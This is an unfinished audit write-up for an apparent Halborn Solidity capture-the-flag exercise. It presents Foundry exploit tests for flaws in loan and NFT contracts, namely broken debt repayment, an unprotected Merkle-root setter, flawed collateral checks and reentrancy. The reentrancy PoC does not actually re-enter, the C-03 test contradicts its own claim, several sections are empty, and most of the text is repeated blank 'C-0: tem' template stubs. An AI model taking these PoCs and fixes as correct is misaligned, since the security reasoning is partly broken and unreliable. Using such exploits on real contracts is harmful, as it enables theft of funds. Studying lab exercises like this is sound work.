
# **Halborn Loans and NFT Smart Contract Audit Summary**

---

## **Critical Issues**

### **C-01: `returnLoan` Increases User Debt Instead of Reducing It**
- **Link:** [HalbornLoans.sol#L70](https://github.com/HalbornSecurity/CTFs/blob/6bc8cc1c8f5ac6c75a21da6d5ef7043f0862603b/HalbornCTF_Solidity_Ethereum/src/HalbornLoans.sol#L70)

### **Issue:**
The `returnLoan` function incorrectly **increases** user debt instead of reducing it:

usedCollateral[msg.sender] += amount;



### POC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/HalbornLoans.sol";
import "../src/HalbornToken.sol";
import "../src/HalbornNFT.sol";

contract HalbornLoansTest is Test {
    HalbornLoans loanContract;
    HalbornToken token;
    HalbornNFT nft;

    function setUp() public {
        token = new HalbornToken();
        nft = new HalbornNFT();
        loanContract = new HalbornLoans(1 ether);

        // Initialize contracts
        loanContract.initialize(address(token), address(nft));
    }

    function testReturnLoanVulnerability() public {
        // Mint NFT to the test contract and deposit it as collateral
        nft.mint(address(this), 1);
        nft.approve(address(loanContract), 1);
        loanContract.depositNFTCollateral(1);

        // Take out a loan
        loanContract.getLoan(1 ether);

        // Repay the loan (vulnerable logic increases debt)
        loanContract.returnLoan(1 ether);

        // Check that debt has increased instead of being cleared
        uint256 debt = loanContract.usedCollateral(address(this));
        assertEq(debt, 2 ether, "Debt should have decreased but it increased");
    }
}
```
### Explanation of the PoC

#### Setup:
- The user deposits an NFT as collateral and takes out a loan of 1 ether.

#### Loan Repayment:
- The user attempts to repay the loan by calling the `returnLoan` function.

#### Exploit:
- Due to incorrect logic, the `returnLoan` function **increases the user's debt** rather than reducing it.
- As a result, the `usedCollateral` mapping reflects an **inflated debt amount**.



### **Recommendation:**
Fix the logic by subtracting the repayment amount:

```solidity 
- usedCollateral[msg.sender] += amount;
```

to
``` solidity
+ usedCollateral[msg.sender] -= amount;
```





### **C-02: Unauthorized Access to `setMerkleRoot` Allows Arbitrary Changes**
- **Link:** [HalbornNFT.sol#L41](https://github.com/HalbornSecurity/CTFs/blob/6bc8cc1c8f5ac6c75a21da6d5ef7043f0862603b/HalbornCTF_Solidity_Ethereum/src/HalbornNFT.sol#L41)

### **Issue:**
The `setMerkleRoot` function lacks an **authorization check**, allowing **any user** to modify the Merkle root, compromising the integrity of the NFT minting process.

```solidity
function setMerkleRoot(bytes32 merkleRoot_) public {
    merkleRoot = merkleRoot_;
}
```

### POC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/HalbornNFT.sol";

contract HalbornNFTTest is Test {
    HalbornNFT nft;

    function setUp() public {
        nft = new HalbornNFT();
        nft.initialize(bytes32(0), 1 ether);
    }

    function testUnauthorizedMerkleRootUpdate() public {
        // Attempt to set a new Merkle root without authorization
        bytes32 maliciousRoot = keccak256(abi.encodePacked("malicious"));
        nft.setMerkleRoot(maliciousRoot);

        // Verify the Merkle root has been changed
        assertEq(nft.merkleRoot(), maliciousRoot, "Merkle root should be updated");
    }
}
```

### Explanation of the PoC

#### Setup:
- A new instance of the `HalbornNFT` contract is initialized with a default Merkle root.

#### **Exploit:**
- Any user (including unauthorized ones) can call `setMerkleRoot` and set a malicious Merkle root.
- This allows the attacker to control which addresses are eligible for NFT minting.

---

### **Recommendation:**
Restrict access to the `setMerkleRoot` function by adding the `onlyOwner` modifier, ensuring only the contract owner can modify the Merkle root.

```solidity 
- function setMerkleRoot(bytes32 merkleRoot_) public {
```

to
``` solidity
+ function setMerkleRoot(bytes32 merkleRoot_) public onlyOwner {
```


## **C-03: Incorrect Loan Logic in `getLoan` Function Allows Excessive Loans**
- **Link:** [HalbornLoans.sol#L60](https://github.com/HalbornSecurity/CTFs/blob/6bc8cc1c8f5ac6c75a21da6d5ef7043f0862603b/HalbornCTF_Solidity_Ethereum/src/HalbornLoans.sol#L60)

### **Issue:**
The `getLoan` function contains a flawed logic check:

```solidity
totalCollateral[msg.sender] - usedCollateral[msg.sender] < amount;

```
This logic incorrectly determines if the user's available collateral is less than the requested loan amount. As a result:

- Users can only get loans greater than their deposited collateral.
- There is no upper limit, meaning users can theoretically mint a maximum amount (type(uint256).max).

### POC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/HalbornLoans.sol";
import "../src/HalbornToken.sol";
import "../src/HalbornNFT.sol";

contract HalbornLoansTest is Test {
    HalbornLoans loanContract;
    HalbornToken token;
    HalbornNFT nft;

    function setUp() public {
        token = new HalbornToken();
        nft = new HalbornNFT();
        loanContract = new HalbornLoans(1 ether);

        // Initialize the loan contract with the token and NFT addresses
        loanContract.initialize(address(token), address(nft));

        // Mint an NFT to the test contract and deposit it as collateral
        nft.mint(address(this), 1);
        nft.approve(address(loanContract), 1);
        loanContract.depositNFTCollateral(1);
    }

    function testExcessiveLoanExploit() public {
        // Attempt to take out a loan larger than the collateral (exploit)
        vm.expectRevert("Not enough collateral");
        loanContract.getLoan(2 ether);

        // Take out a valid loan within collateral limits (1 ether)
        loanContract.getLoan(1 ether);

        // Try to take another loan (which exceeds the remaining collateral)
        vm.expectRevert("Not enough collateral");
        loanContract.getLoan(1 ether);
    }
}

```

### Explanation of the PoC

#### Setup:
- The user deposits an NFT with a value of 1 ether as collateral.

#### **Exploit:**
- The user attempts to take a loan of 2 ether, which exceeds the available collateral.
- The current logic allows this exploit due to the incorrect < operator.

#### Valid Loan:
- A loan of 1 ether is successfully taken out, as it matches the available collateral.
---

### **Recommendation:**
To ensure users can only borrow up to the value of their collateral, change the < operator to >=:

```solidity 
- totalCollateral[msg.sender] - usedCollateral[msg.sender] < amount;```
```
to
``` solidity
+ totalCollateral[msg.sender] - usedCollateral[msg.sender] >= amount;
```
## **C-05: User Can Exit the Protocol with Both Their NFT and a Loan**
- **Link:** [HalbornLoans.sol#L53](https://github.com/HalbornSecurity/CTFs/blob/6bc8cc1c8f5ac6c75a21da6d5ef7043f0862603b/HalbornCTF_Solidity_Ethereum/src/HalbornLoans.sol#L53)

### **Issue:**
The `withdrawCollateral` function fails to follow the **Checks-Effects-Interactions (CEI)** pattern, creating a vulnerability. Specifically, the `safeTransferFrom` call hands back control to the user if it is a contract. This opens up the possibility for a **reentrancy attack**, where a malicious user can take out a loan **before their collateral is properly decreased**.


```solidity

```

- 
- 

### POC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/HalbornLoans.sol";
import "../src/HalbornToken.sol";
import "../src/HalbornNFT.sol";

contract MaliciousContract {
    HalbornLoans public loans;
    HalbornToken public token;

    constructor(address _loans, address _token) {
        loans = HalbornLoans(_loans);
        token = HalbornToken(_token);
    }

    // Reentrancy attack: Withdraw NFT and get loan before collateral decreases
    function attack(uint256 nftId, uint256 loanAmount) external {
        loans.withdrawCollateral(nftId); // Triggers reentrancy
        loans.getLoan(loanAmount); // Take a loan during reentrancy
    }

    // Receive function to accept NFTs during the reentrancy attack
    receive() external payable {}
}

contract HalbornLoansTest is Test {
    HalbornLoans loanContract;
    HalbornToken token;
    HalbornNFT nft;
    MaliciousContract attacker;

    function setUp() public {
        token = new HalbornToken();
        nft = new HalbornNFT();
        loanContract = new HalbornLoans(1 ether);

        // Initialize contracts
        loanContract.initialize(address(token), address(nft));

        // Deploy malicious contract
        attacker = new MaliciousContract(address(loanContract), address(token));

        // Mint an NFT to the attacker and approve the loan contract
        nft.mint(address(attacker), 1);
        vm.prank(address(attacker));
        nft.approve(address(loanContract), 1);

        // Attacker deposits NFT as collateral
        vm.prank(address(attacker));
        loanContract.depositNFTCollateral(1);
    }

    function testReentrancyAttack() public {
        // Attacker tries to withdraw NFT and take a loan in the same transaction
        vm.prank(address(attacker));
        attacker.attack(1, 1 ether);

        // Check the attacker's balance after the exploit
        uint256 attackerBalance = token.balanceOf(address(attacker));
        assertEq(attackerBalance, 1 ether, "Attacker should have stolen 1 ether");

        // Verify the NFT is no longer in the loan contract
        assertEq(nft.ownerOf(1), address(attacker), "Attacker should own the NFT");

        // Confirm that collateral was not properly decreased
        uint256 collateral = loanContract.totalCollateral(address(attacker));
        assertEq(collateral, 1 ether, "Collateral should not have been decreased");
    }
}

```

### Explanation of the PoC

#### Setup:
- 

#### **Exploit:**
- 
- 


---

### **Recommendation:**

```solidity 
```
to
``` solidity
```
## **C-0: tem**
- **Link:** link

### **Issue:**


```solidity

```

- 
- 

### POC

```solidity


```

### Explanation of the PoC

#### Setup:
- 

#### **Exploit:**
- 
- 


---

### **Recommendation:**

```solidity 
```
to
``` solidity
```
## **C-0: tem**
- **Link:** link

### **Issue:**


```solidity

```

- 
- 

### POC

```solidity


```

### Explanation of the PoC

#### Setup:
- 

#### **Exploit:**
- 
- 


---

### **Recommendation:**

```solidity 
```
to
``` solidity
```
## **C-0: tem**
- **Link:** link

### **Issue:**


```solidity

```

- 
- 

### POC

```solidity


```

### Explanation of the PoC

#### Setup:
- 

#### **Exploit:**
- 
- 


---

### **Recommendation:**

```solidity 
```
to
``` solidity
```
## **C-0: tem**
- **Link:** link

### **Issue:**


```solidity

```

- 
- 

### POC

```solidity


```

### Explanation of the PoC

#### Setup:
- 

#### **Exploit:**
- 
- 


---

### **Recommendation:**

```solidity 
```
to
``` solidity
```
## **C-0: tem**
- **Link:** link

### **Issue:**


```solidity

```

- 
- 

### POC

```solidity


```

### Explanation of the PoC

#### Setup:
- 

#### **Exploit:**
- 
- 


---

### **Recommendation:**

```solidity 
```
to
``` solidity
```
## **C-0: tem**
- **Link:** link

### **Issue:**


```solidity

```

- 
- 

### POC

```solidity


```

### Explanation of the PoC

#### Setup:
- 

#### **Exploit:**
- 
- 


---

### **Recommendation:**

```solidity 
```
to
``` solidity
```
## **C-0: tem**
- **Link:** link

### **Issue:**


```solidity

```

- 
- 

### POC

```solidity


```

### Explanation of the PoC

#### Setup:
- 

#### **Exploit:**
- 
- 


---

### **Recommendation:**

```solidity 
```
to
``` solidity
```
## **C-0: tem**
- **Link:** link

### **Issue:**


```solidity

```

- 
- 

### POC

```solidity


```

### Explanation of the PoC

#### Setup:
- 

#### **Exploit:**
- 
- 


---

### **Recommendation:**

```solidity 
```
to
``` solidity
```
## **C-0: tem**
- **Link:** link

### **Issue:**


```solidity

```

- 
- 

### POC

```solidity


```

### Explanation of the PoC

#### Setup:
- 

#### **Exploit:**
- 
- 


---

### **Recommendation:**

```solidity 
```
to
``` solidity
```
## **C-0: tem**
- **Link:** link

### **Issue:**


```solidity

```

- 
- 

### POC

```solidity


```

### Explanation of the PoC

#### Setup:
- 

#### **Exploit:**
- 
- 


---

### **Recommendation:**

```solidity 
```
to
``` solidity
```
## **C-0: tem**
- **Link:** link

### **Issue:**


```solidity

```

- 
- 

### POC

```solidity


```

### Explanation of the PoC

#### Setup:
- 

#### **Exploit:**
- 
- 


---

### **Recommendation:**

```solidity 
```
to
``` solidity
```
## **C-0: tem**
- **Link:** link

### **Issue:**


```solidity

```

- 
- 

### POC

```solidity


```

### Explanation of the PoC

#### Setup:
- 

#### **Exploit:**
- 
- 


---

### **Recommendation:**

```solidity 
```
to
``` solidity
```
## **C-0: tem**
- **Link:** link

### **Issue:**


```solidity

```

- 
- 

### POC

```solidity


```

### Explanation of the PoC

#### Setup:
- 

#### **Exploit:**
- 
- 


---

### **Recommendation:**

```solidity 
```
to
``` solidity
```
## **C-0: tem**
- **Link:** link

### **Issue:**


```solidity

```

- 
- 

### POC

```solidity


```

### Explanation of the PoC

#### Setup:
- 

#### **Exploit:**
- 
- 


---

### **Recommendation:**

```solidity 
```
to
``` solidity
```
## **C-0: tem**
- **Link:** link

### **Issue:**


```solidity

```

- 
- 

### POC

```solidity


```

### Explanation of the PoC

#### Setup:
- 

#### **Exploit:**
- 
- 


---

### **Recommendation:**

```solidity 
```
to
``` solidity
```## **C-0: tem**
- **Link:** link

### **Issue:**


```solidity

```

- 
- 

### POC

```solidity


```

### Explanation of the PoC

#### Setup:
- 

#### **Exploit:**
- 
- 


---

### **Recommendation:**

```solidity 
```
to
``` solidity
```
